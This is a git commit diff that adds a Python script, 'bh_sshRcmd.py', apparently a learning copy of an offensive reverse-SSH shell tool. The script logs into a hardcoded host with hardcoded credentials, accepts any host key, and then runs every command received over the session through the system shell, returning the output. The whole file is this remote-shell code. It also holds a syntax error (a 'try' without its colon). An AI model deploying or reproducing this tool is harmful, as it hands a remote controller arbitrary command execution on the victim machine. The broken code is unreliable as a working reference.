dd96688fe58f850c6d4450c059e9a59ddfaddcd6
yuankan20081 <176307920@qq.com>
2015-03-14 00:43:05 +0800

    complete file bh_sshRcmd

--- bh_sshRcmd.py
+++ bh_sshRcmd.py
@@ -1,1 +1,26 @@
 __author__ = 'yuankan'
+import threading
+import paramiko
+import subprocess
+
+def ssh_command(ip, user, passwd, command):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, username=user, password=passwd)
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send(command)
+        # read banner
+        print ssh_session.recv(1024)
+        while True:
+            command = ssh_session.recv(1024)
+            try
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception, e:
+                ssh_session.send(str(e))
+        client.close()
+    return
+
+if __name__ == "__main__":
+    ssh_command("192.168.1.100", "justin", "lovethepython", "ClientConnected")
